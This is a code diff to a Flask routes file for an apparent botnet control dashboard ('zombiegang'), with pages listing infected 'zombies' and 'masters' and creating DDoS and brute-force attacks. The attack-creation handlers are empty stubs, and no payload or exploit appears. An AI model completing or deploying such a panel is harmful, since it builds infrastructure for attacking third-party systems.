@@ -9,16 +9,16 @@ from datetime import datetime, timedelta
 from functools import wraps
 
 from app.objects import zession, token
-from app.get_data import filter
+from app.get_data import get_filtered_data
 from app.update_data import update_user
 
 
-# init zombiegang session object
+# init zombiegang session
 zession = zession.Zession
 token = token.Token()
 
 
-# Defining our custom decorator
+# login requirements
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
@@ -52,53 +52,60 @@ def login():
             error = token.error
     return render_template("login.html", error=error, zession=zession)
 
+
 @app.route('/logout/', methods=['GET', 'POST'])
 @login_required
 def logout():
     zession.jwt = False
     return redirect(url_for("login"))
 
+
 @app.route('/game/', methods=['GET', 'POST'])
 @login_required
 def game():
     return render_template("game.html", zession=zession)
+
 
 @app.route('/dashboard/', methods=['GET', 'POST'])
 @login_required
 def dashboard():
     return render_template("dashboard/base_dashboard.html", zession=zession)
 
+
 @app.route('/access-logs/', methods=['GET', 'POST'])
 @login_required
 def access_logs():
     zession.current_section = 'logs'
-
     data = {}
-    error = None
+    filter_error = None
+
     # first request get only last hour access logs
     by_datetime_aft = (datetime.now() - timedelta(hours = 1)).strftime('%Y-%m-%d %H:%M:%S')
     by_username = by_datetime_bef = ''
     # filter data
-    data = filter(zession, request, 'access_logs', by_username, by_datetime_bef, by_datetime_aft)
-    if not data:
-        error = '0 logs found'
+    if (request.method) == 'GET' or ('btn-filter' in request.form):
+        data = get_filtered_data(zession, request, 'access_logs', by_username, by_datetime_bef, by_datetime_aft)
+        if not data:
+            filter_error = '0 logs found'
 
-    return render_template("dashboard/logs/access-logs.html", zession=zession, error=error, data=data)
+    return render_template("dashboard/logs/access-logs.html", zession=zession, filter_error=filter_error, data=data)
+
 
 @app.route('/zombies/', methods=['GET', 'POST'])
 @login_required
 def zombies():
     zession.current_section = 'members'
-
     data = {}
-    error = None
-    by_username = by_datetime_bef = by_datetime_aft = ''
-    # filter data
-    data = filter(zession, request, 'zombies', by_username, by_datetime_bef, by_datetime_aft)
-    if not data:
-        error = '0 zombies found'
+    filter_error = None
 
-    return render_template("dashboard/members/zombies.html", zession=zession, error=error, data=data)
+    # filter data
+    by_username = by_datetime_bef = by_datetime_aft = by_os = ''
+    if (request.method) == 'GET' or ('btn-filter' in request.form):
+        data = get_filtered_data(zession, request, 'zombies', by_username, by_datetime_bef, by_datetime_aft, by_os)
+        if not data:
+            filter_error = '0 zombies found'
+
+    return render_template("dashboard/members/zombies.html", zession=zession, filter_error=filter_error, data=data)
 
 
 @app.route('/masters/', methods=['GET', 'POST'])
@@ -107,68 +114,71 @@ def masters():
 
     zession.current_section = 'members'
     data = {}
-    error = None
+    filter_error = update_error = None
+    edit_profile = False
 
+    # launch profile editor
     if (request.method) == 'POST' and ('btn-launcher' in request.form):
-        return redirect(url_for('edit_profile'))
+        edit_profile = True
+        #return redirect(url_for('edit_profile'))
 
-    by_username = ''
-    # filter data
-    data = filter(zession, request, 'masters', by_username)
-    if not data:
-        error = '0 masters found'
-
-    return render_template("dashboard/members/masters.html", zession=zession, error=error, data=data)
-
-
-@app.route('/edit-profile/', methods=['GET', 'POST'])
-@login_required
-def edit_profile():
-    zession.current_section = 'members'
-    data = {}
-    error = None
-
-    if (request.method) == 'POST' and ('btn-filter' in request.form):
-        return redirect(url_for('masters'))
-
-    elif request.method == 'POST':
+    # update profile
+    elif (request.method) == 'POST' and not ('btn-launcher' in request.form or 'btn-filter' in request.form):
         # update master password
         if ('pswd-btn' in request.form):
             if not request.form.get('pswd'):
-                error = 'introduce the new password'
+                update_error = 'introduce the new password'
             else:
                 response = update_user(zession, zession.username, request.form.get('pswd'))
                 if response and ('jwt' in response):
                     zession.jwt = response['jwt']
-                    error = 'password updated'
+                    update_error = 'password updated'
 
         # update master public key
         elif ('public_key_btn' in request.form):
             if not request.form.get('public_key'):
-                error = 'introduce the new public_key'
+                update_error = 'introduce the new public_key'
             # ...
 
-    return render_template("dashboard/members/edit-profile.html", zession=zession, update_error=error, data=data)
+    # filter data
+    by_username = ''
+    if (request.method) == 'GET' or ('btn-filter' in request.form):
+        data = get_filtered_data(zession, request, 'masters', by_username)
+        if not data:
+            filter_error = '0 masters found'
+
+    return render_template("dashboard/members/masters.html", zession=zession, filter_error=filter_error, update_error=update_error, data=data, edit_profile=edit_profile)
+
 
 @app.route('/ddos-attacks/', methods=['GET', 'POST'])
 @login_required
 def ddos_attacks():
     zession.current_section = 'tools'
     data = {}
-    error = None
+    filter_error = create_error = None
+    create_attack = False
 
     # filter data
     if (request.method == 'POST') and ('btn-filter' in request.form):
-        data = filter(zession, request, 'ddos-attacks')
+        data = get_filtered_data(zession, request, 'ddos-attacks')
         if not data:
-            error = '0 attacks found'
+            filter_error = '0 attacks found'
 
-    # create ddos attacks
-    if (request.method == 'POST') and ('creator' in request.form):
-        print(request.form.get('ddos_type'))
+    # launch ddos attack creator
+    if (request.method == 'POST') and ('btn-launcher' in request.form):
+        data = get_filtered_data(zession, request, 'zombies')
+        filter_error = ''
+        create_attack = True
+
+    # create new ddos attack
+    if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
+        print(request.form)
+        pass
         # ...
+        # data = get_filtered_data(zession, request, 'zombies')
+        # return render_template("dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)
 
-    return render_template("dashboard/tools/ddos-attacks.html", zession=zession, error=error, data=data)
+    return render_template("dashboard/tools/ddos-attacks.html", zession=zession, filter_error=filter_error, create_error=create_error, data=data, create_attack=create_attack)
 
 
 @app.route('/brute-attacks/', methods=['GET', 'POST'])
@@ -176,16 +186,27 @@ def ddos_attacks():
 def brute_attacks():
     zession.current_section = 'tools'
     data = {}
-    error = None
+    filter_error = create_error = None
+    create_attack = False
 
     # filter data
     if (request.method == 'POST') and ('btn-filter' in request.form):
-        data = filter(zession, request, 'brute-attacks')
+        data = get_filtered_data(zession, request, 'brute-attacks')
         if not data:
-            error = '0 attacks found'
+            filter_error = '0 attacks found'
 
-    if (request.method == 'POST') and ('creator' in request.form):
+    # launch ddos attack creator
+    if (request.method == 'POST') and ('btn-launcher' in request.form):
+        data = get_filtered_data(zession, request, 'zombies')
+        filter_error = ''
+        create_attack = True
+
+    # create new ddos attack
+    if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
+        print(request.form)
         pass
         # ...
+        # data = get_filtered_data(zession, request, 'zombies')
+        # return render_template("dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)
 
-    return render_template("dashboard/tools/brute-attacks.html", zession=zession, error=error, data=data)
+    return render_template("dashboard/tools/brute-attacks.html", zession=zession, filter_error=filter_error, create_error=create_error, data=data, create_attack=create_attack)
